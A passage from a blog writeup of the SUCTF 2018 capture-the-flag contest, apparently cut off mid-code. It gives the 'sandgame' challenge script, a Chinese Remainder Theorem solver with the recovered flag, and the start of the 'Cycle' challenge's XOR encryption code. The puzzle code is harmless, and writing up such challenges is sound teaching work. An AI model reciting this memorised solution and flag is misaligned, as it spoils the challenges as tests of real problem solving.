id=top><script>localStorage.getItem("pref-theme")==="dark"?document.body.classList.add("dark"):localStorage.getItem("pref-theme")==="light"?document.body.classList.remove("dark"):window.matchMedia("(prefers-color-scheme: dark)").matches&&document.body.classList.add("dark")</script><header class=header><nav class=nav><div class=logo><a href=https://ret2neo.cn/ accesskey=h title="闲言语 (Alt + H)">闲言语</a><div class=logo-switches><button id=theme-toggle accesskey=t title="(Alt + T)"><svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg><svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg></button></div></div><ul id=menu><li><a href=https://ret2neo.cn/mind/ title=随笔><span>随笔</span></a></li><li><a href=https://ret2neo.cn/about title=关于><span>关于</span></a></li><li><a href=https://ret2neo.cn/search title="搜索 (Alt + /)" accesskey=/><span>搜索</span></a></li></ul></nav></header><main class=main><article class=post-single><header class=post-header><h1 class=post-title>suctf writeup</h1><div class=post-meta><span title='2018-05-27 22:07:58 +0800 CST'>May 27, 2018</span>&nbsp;|&nbsp;<a href=https://github.dev/findneo/priblog/content/post/180527suctf.md rel="noopener noreferrer" target=_blank>edit</a></div></header><aside id=toc-container class="toc-container wide"><div class=toc><details open><summary accesskey=c title="(Alt + C)"><span class=details>目录</span></summary><div class=inner><ul><li><a href=#misc aria-label=MISC>MISC</a><ul><li><a href=#sandgame aria-label=sandgame>sandgame</a></li><li><a href=#cycle aria-label=Cycle>Cycle</a></li></ul></li><li><a href=#web aria-label=WEB>WEB</a><ul><li><a href=#anonymous aria-label=Anonymous>Anonymous</a></li><li><a href=#getshell aria-label=Getshell>Getshell</a></li></ul></li><li><a href=#crypto aria-label=CRYPTO>CRYPTO</a><ul><li><a href=#magic aria-label=Magic>Magic</a></li></ul></li><li><a href=#%e9%a2%98%e7%9b%ae%e5%a4%87%e4%bb%bd aria-label=题目备份>题目备份</a></li></ul></div></details></div></aside><script>let activeElement,elements;window.addEventListener("DOMContentLoaded",function(){checkTocPosition(),elements=document.querySelectorAll("h1[id],h2[id],h3[id],h4[id],h5[id],h6[id]"),activeElement=elements[0];const t=encodeURI(activeElement.getAttribute("id")).toLowerCase();document.querySelector(`.inner ul li a[href="#${t}"]`).classList.add("active")},!1),window.addEventListener("resize",function(){checkTocPosition()},!1),window.addEventListener("scroll",()=>{activeElement=Array.from(elements).find(e=>{if(getOffsetTop(e)-window.pageYOffset>0&&getOffsetTop(e)-window.pageYOffset<window.innerHeight/2)return e})||activeElement,elements.forEach(e=>{const t=encodeURI(e.getAttribute("id")).toLowerCase();e===activeElement?document.querySelector(`.inner ul li a[href="#${t}"]`).classList.add("active"):document.querySelector(`.inner ul li a[href="#${t}"]`).classList.remove("active")})},!1);const main=parseInt(getComputedStyle(document.body).getPropertyValue("--article-width"),10),toc=parseInt(getComputedStyle(document.body).getPropertyValue("--toc-width"),10),gap=parseInt(getComputedStyle(document.body).getPropertyValue("--gap"),10);function checkTocPosition(){const e=document.body.scrollWidth;e-main-toc*2-gap*4>0?document.getElementById("toc-container").classList.add("wide"):document.getElementById("toc-container").classList.remove("wide")}function getOffsetTop(e){if(!e.getClientRects().length)return 0;let t=e.getBoundingClientRect(),n=e.ownerDocument.defaultView;return t.top+n.pageYOffset}</script><div class=post-content><h1 id=misc>MISC<a hidden class=anchor aria-hidden=true href=#misc>#</a></h1><h2 id=sandgame>sandgame<a hidden class=anchor aria-hidden=true href=#sandgame>#</a></h2><p>game.py</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-0-1><a style=outline:none;text-decoration:none;color:inherit href=#hl-0-1>1</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-0-2><a style=outline:none;text-decoration:none;color:inherit href=#hl-0-2>2</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-0-3><a style=outline:none;text-decoration:none;color:inherit href=#hl-0-3>3</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-0-4><a style=outline:none;text-decoration:none;color:inherit href=#hl-0-4>4</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-0-5><a style=outline:none;text-decoration:none;color:inherit href=#hl-0-5>5</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-0-6><a style=outline:none;text-decoration:none;color:inherit href=#hl-0-6>6</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-0-7><a style=outline:none;text-decoration:none;color:inherit href=#hl-0-7>7</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-0-8><a style=outline:none;text-decoration:none;color:inherit href=#hl-0-8>8</a>
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#f92672>import</span> flag
</span></span><span style=display:flex><span>flag <span style=color:#f92672>=</span> flag<span style=color:#f92672>.</span>flag
</span></span><span style=display:flex><span>sands <span style=color:#f92672>=</span> int(flag[<span style=color:#ae81ff>5</span>:<span style=color:#f92672>-</span><span style=color:#ae81ff>1</span>]<span style=color:#f92672>.</span>encode(<span style=color:#e6db74>&#34;hex&#34;</span>), <span style=color:#ae81ff>16</span>)
</span></span><span style=display:flex><span>holes <span style=color:#f92672>=</span> [<span style=color:#ae81ff>257</span>, <span style=color:#ae81ff>263</span>, <span style=color:#ae81ff>269</span>, <span style=color:#ae81ff>271</span>, <span style=color:#ae81ff>277</span>, <span style=color:#ae81ff>281</span>, <span style=color:#ae81ff>283</span>, <span style=color:#ae81ff>293</span>, <span style=color:#ae81ff>307</span>, <span style=color:#ae81ff>311</span>, <span style=color:#ae81ff>313</span>, <span style=color:#ae81ff>317</span>, <span style=color:#ae81ff>331</span>, <span style=color:#ae81ff>337</span>, <span style=color:#ae81ff>347</span>, <span style=color:#ae81ff>349</span>, <span style=color:#ae81ff>353</span>, <span style=color:#ae81ff>359</span>, <span style=color:#ae81ff>367</span>, <span style=color:#ae81ff>373</span>]
</span></span><span style=display:flex><span><span style=color:#66d9ef>with</span> open(<span style=color:#e6db74>&#34;sand.txt&#34;</span>, <span style=color:#e6db74>&#34;w&#34;</span>) <span style=color:#66d9ef>as</span> f:
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>for</span> i <span style=color:#f92672>in</span> range(len(holes)):
</span></span><span style=display:flex><span>        sand <span style=color:#f92672>=</span> sands <span style=color:#f92672>%</span> holes[i]
</span></span><span style=display:flex><span>        f<span style=color:#f92672>.</span>write(str(sand)<span style=color:#f92672>+</span><span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>)
</span></span></code></pre></td></tr></table></div></div><p>solution.py</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-1-1><a style=outline:none;text-decoration:none;color:inherit href=#hl-1-1> 1</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-1-2><a style=outline:none;text-decoration:none;color:inherit href=#hl-1-2> 2</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-1-3><a style=outline:none;text-decoration:none;color:inherit href=#hl-1-3> 3</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-1-4><a style=outline:none;text-decoration:none;color:inherit href=#hl-1-4> 4</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-1-5><a style=outline:none;text-decoration:none;color:inherit href=#hl-1-5> 5</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-1-6><a style=outline:none;text-decoration:none;color:inherit href=#hl-1-6> 6</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-1-7><a style=outline:none;text-decoration:none;color:inherit href=#hl-1-7> 7</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-1-8><a style=outline:none;text-decoration:none;color:inherit href=#hl-1-8> 8</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-1-9><a style=outline:none;text-decoration:none;color:inherit href=#hl-1-9> 9</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-1-10><a style=outline:none;text-decoration:none;color:inherit href=#hl-1-10>10</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-1-11><a style=outline:none;text-decoration:none;color:inherit href=#hl-1-11>11</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-1-12><a style=outline:none;text-decoration:none;color:inherit href=#hl-1-12>12</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-1-13><a style=outline:none;text-decoration:none;color:inherit href=#hl-1-13>13</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-1-14><a style=outline:none;text-decoration:none;color:inherit href=#hl-1-14>14</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-1-15><a style=outline:none;text-decoration:none;color:inherit href=#hl-1-15>15</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-1-16><a style=outline:none;text-decoration:none;color:inherit href=#hl-1-16>16</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-1-17><a style=outline:none;text-decoration:none;color:inherit href=#hl-1-17>17</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-1-18><a style=outline:none;text-decoration:none;color:inherit href=#hl-1-18>18</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-1-19><a style=outline:none;text-decoration:none;color:inherit href=#hl-1-19>19</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-1-20><a style=outline:none;text-decoration:none;color:inherit href=#hl-1-20>20</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-1-21><a style=outline:none;text-decoration:none;color:inherit href=#hl-1-21>21</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-1-22><a style=outline:none;text-decoration:none;color:inherit href=#hl-1-22>22</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-1-23><a style=outline:none;text-decoration:none;color:inherit href=#hl-1-23>23</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-1-24><a style=outline:none;text-decoration:none;color:inherit href=#hl-1-24>24</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-1-25><a style=outline:none;text-decoration:none;color:inherit href=#hl-1-25>25</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-1-26><a style=outline:none;text-decoration:none;color:inherit href=#hl-1-26>26</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-1-27><a style=outline:none;text-decoration:none;color:inherit href=#hl-1-27>27</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-1-28><a style=outline:none;text-decoration:none;color:inherit href=#hl-1-28>28</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-1-29><a style=outline:none;text-decoration:none;color:inherit href=#hl-1-29>29</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-1-30><a style=outline:none;text-decoration:none;color:inherit href=#hl-1-30>30</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-1-31><a style=outline:none;text-decoration:none;color:inherit href=#hl-1-31>31</a>
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#75715e>#coding:utf8</span>
</span></span><span style=display:flex><span><span style=color:#75715e># import flag</span>
</span></span><span style=display:flex><span><span style=color:#75715e># 解同余方程组；中国剩余定理，韩信点兵，扩展欧几里得，模反 &lt;= 深入理解</span>
</span></span><span style=display:flex><span><span style=color:#75715e>#求模反元素，模逆元</span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span>     <span style=color:#a6e22e>gcd</span>(a,b):
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>while</span> a<span style=color:#f92672>!=</span><span style=color:#ae81ff>0</span>:
</span></span><span style=display:flex><span>            a,b <span style=color:#f92672>=</span> b<span style=color:#f92672>%</span>a,a
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> b
</span></span><span style=display:flex><span><span style=color:#75715e>#定义一个函数，参数分别为a,n，返回值为b</span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span>     <span style=color:#a6e22e>findModReverse</span>(a,m):<span style=color:#75715e>#这个扩展欧几里得算法求模逆</span>
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span> gcd(a,m)<span style=color:#f92672>!=</span><span style=color:#ae81ff>1</span>:
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>return</span> <span style=color:#66d9ef>None</span>
</span></span><span style=display:flex><span>        u1,u2,u3 <span style=color:#f92672>=</span> <span style=color:#ae81ff>1</span>,<span style=color:#ae81ff>0</span>,a
</span></span><span style=display:flex><span>        v1,v2,v3 <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>,<span style=color:#ae81ff>1</span>,m
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>while</span> v3<span style=color:#f92672>!=</span><span style=color:#ae81ff>0</span>:
</span></span><span style=display:flex><span>            q <span style=color:#f92672>=</span> u3<span style=color:#f92672>//</span>v3
</span></span><span style=display:flex><span>            v1,v2,v3,u1,u2,u3 <span style=color:#f92672>=</span> (u1<span style=color:#f92672>-</span>q<span style=color:#f92672>*</span>v1),(u2<span style=color:#f92672>-</span>q<span style=color:#f92672>*</span>v2),(u3<span style=color:#f92672>-</span>q<span style=color:#f92672>*</span>v3),v1,v2,v3
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> u1<span style=color:#f92672>%</span>m
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>holes <span style=color:#f92672>=</span> [<span style=color:#ae81ff>257</span>, <span style=color:#ae81ff>263</span>, <span style=color:#ae81ff>269</span>, <span style=color:#ae81ff>271</span>, <span style=color:#ae81ff>277</span>, <span style=color:#ae81ff>281</span>, <span style=color:#ae81ff>283</span>, <span style=color:#ae81ff>293</span>, <span style=color:#ae81ff>307</span>, <span style=color:#ae81ff>311</span>, <span style=color:#ae81ff>313</span>, <span style=color:#ae81ff>317</span>, <span style=color:#ae81ff>331</span>, <span style=color:#ae81ff>337</span>, <span style=color:#ae81ff>347</span>, <span style=color:#ae81ff>349</span>, <span style=color:#ae81ff>353</span>, <span style=color:#ae81ff>359</span>, <span style=color:#ae81ff>367</span>, <span style=color:#ae81ff>373</span>]
</span></span><span style=display:flex><span>sand <span style=color:#f92672>=</span>  [<span style=color:#ae81ff>222</span>, <span style=color:#ae81ff>203</span>, <span style=color:#ae81ff>33</span>, <span style=color:#ae81ff>135</span>, <span style=color:#ae81ff>203</span>, <span style=color:#ae81ff>62</span>, <span style=color:#ae81ff>227</span>, <span style=color:#ae81ff>82</span>, <span style=color:#ae81ff>239</span>, <span style=color:#ae81ff>82</span>, <span style=color:#ae81ff>11</span>, <span style=color:#ae81ff>220</span>, <span style=color:#ae81ff>74</span>, <span style=color:#ae81ff>92</span>, <span style=color:#ae81ff>8</span>, <span style=color:#ae81ff>308</span>, <span style=color:#ae81ff>195</span>, <span style=color:#ae81ff>165</span>, <span style=color:#ae81ff>87</span>, <span style=color:#ae81ff>4</span>]
</span></span><span style=display:flex><span>M<span style=color:#f92672>=</span><span style=color:#ae81ff>1</span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>for</span> i <span style=color:#f92672>in</span> holes:
</span></span><span style=display:flex><span>	M<span style=color:#f92672>*=</span>i
</span></span><span style=display:flex><span>s<span style=color:#f92672>=</span><span style=color:#ae81ff>0</span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>for</span> i,j <span style=color:#f92672>in</span> enumerate(holes):
</span></span><span style=display:flex><span>	mi<span style=color:#f92672>=</span>j
</span></span><span style=display:flex><span>	Mi<span style=color:#f92672>=</span>M<span style=color:#f92672>/</span>mi
</span></span><span style=display:flex><span>	s<span style=color:#f92672>=</span>s<span style=color:#f92672>+</span>findModReverse(Mi,mi)<span style=color:#f92672>*</span>sand[i]<span style=color:#f92672>*</span>Mi
</span></span><span style=display:flex><span>print str(hex(s<span style=color:#f92672>%</span>M)[<span style=color:#ae81ff>2</span>:<span style=color:#f92672>-</span><span style=color:#ae81ff>1</span>])<span style=color:#f92672>.</span>decode(<span style=color:#e6db74>&#39;hex&#39;</span>)
</span></span><span style=display:flex><span><span style=color:#75715e># This_is_the_CRT_xwg)</span>
</span></span></code></pre></td></tr></table></div></div><p>韩信点兵问题，根据中国剩余定理构造通解</p><p><img loading=lazy src=052fefd7e11d0657d.png alt></p><h2 id=cycle>Cycle<a hidden class=anchor aria-hidden=true href=#cycle>#</a></h2><p>cycle.py</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-2-1><a style=outline:none;text-decoration:none;color:inherit href=#hl-2-1> 1</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-2-2><a style=outline:none;text-decoration:none;color:inherit href=#hl-2-2> 2</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-2-3><a style=outline:none;text-decoration:none;color:inherit href=#hl-2-3> 3</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-2-4><a style=outline:none;text-decoration:none;color:inherit href=#hl-2-4> 4</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-2-5><a style=outline:none;text-decoration:none;color:inherit href=#hl-2-5> 5</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-2-6><a style=outline:none;text-decoration:none;color:inherit href=#hl-2-6> 6</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-2-7><a style=outline:none;text-decoration:none;color:inherit href=#hl-2-7> 7</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-2-8><a style=outline:none;text-decoration:none;color:inherit href=#hl-2-8> 8</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-2-9><a style=outline:none;text-decoration:none;color:inherit href=#hl-2-9> 9</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-2-10><a style=outline:none;text-decoration:none;color:inherit href=#hl-2-10>10</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-2-11><a style=outline:none;text-decoration:none;color:inherit href=#hl-2-11>11</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-2-12><a style=outline:none;text-decoration:none;color:inherit href=#hl-2-12>12</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-2-13><a style=outline:none;text-decoration:none;color:inherit href=#hl-2-13>13</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-2-14><a style=outline:none;text-decoration:none;color:inherit href=#hl-2-14>14</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-2-15><a style=outline:none;text-decoration:none;color:inherit href=#hl-2-15>15</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-2-16><a style=outline:none;text-decoration:none;color:inherit href=#hl-2-16>16</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-2-17><a style=outline:none;text-decoration:none;color:inherit href=#hl-2-17>17</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-2-18><a style=outline:none;text-decoration:none;color:inherit href=#hl-2-18>18</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-2-19><a style=outline:none;text-decoration:none;color:inherit href=#hl-2-19>19</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-2-20><a style=outline:none;text-decoration:none;color:inherit href=#hl-2-20>20</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-2-21><a style=outline:none;text-decoration:none;color:inherit href=#hl-2-21>21</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-2-22><a style=outline:none;text-decoration:none;color:inherit href=#hl-2-22>22</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-2-23><a style=outline:none;text-decoration:none;color:inherit href=#hl-2-23>23</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-2-24><a style=outline:none;text-decoration:none;color:inherit href=#hl-2-24>24</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-2-25><a style=outline:none;text-decoration:none;color:inherit href=#hl-2-25>25</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-2-26><a style=outline:none;text-decoration:none;color:inherit href=#hl-2-26>26</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-2-27><a style=outline:none;text-decoration:none;color:inherit href=#hl-2-27>27</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-2-28><a style=outline:none;text-decoration:none;color:inherit href=#hl-2-28>28</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-2-29><a style=outline:none;text-decoration:none;color:inherit href=#hl-2-29>29</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-2-30><a style=outline:none;text-decoration:none;color:inherit href=#hl-2-30>30</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-2-31><a style=outline:none;text-decoration:none;color:inherit href=#hl-2-31>31</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-2-32><a style=outline:none;text-decoration:none;color:inherit href=#hl-2-32>32</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-2-33><a style=outline:none;text-decoration:none;color:inherit href=#hl-2-33>33</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-2-34><a style=outline:none;text-decoration:none;color:inherit href=#hl-2-34>34</a>
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#f92672>import</span> flag
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>encryt</span>(key, plain):
</span></span><span style=display:flex><span>    cipher <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;&#34;</span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>for</span> i <span style=color:#f92672>in</span> range(len(plain)):
</span></span><span style=display:flex><span>        cipher <span style=color:#f92672>+=</span> chr(ord(key[i <span style=color:#f92672>%</span> len(key)]) <span style=color:#f92672>^</span> ord(plain[i]))
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> cipher
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>getPlainText</span>():
</span></span><span style=display:flex><span>    plain <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;&#34;</span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>with</span> open(<span style=color:#e6db74>&#34;plain.txt&#34;</span>) <span style=color:#66d9ef>as</span> f:
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>while</span> <span style=color:#66d9ef>True</span>:
</span></span><span style=display:flex><span>            line <span style=color:#f92672>=</span> f<span style=color:#f92672>.</span>readline()
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>if</span> line:
</span></span><span style=display:flex><span>                plain <span style=color:#f92672>+=</span> line
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>else</span>:
</span></span><span style=display:flex><span>                <span style=color:#66d9ef>break</span>
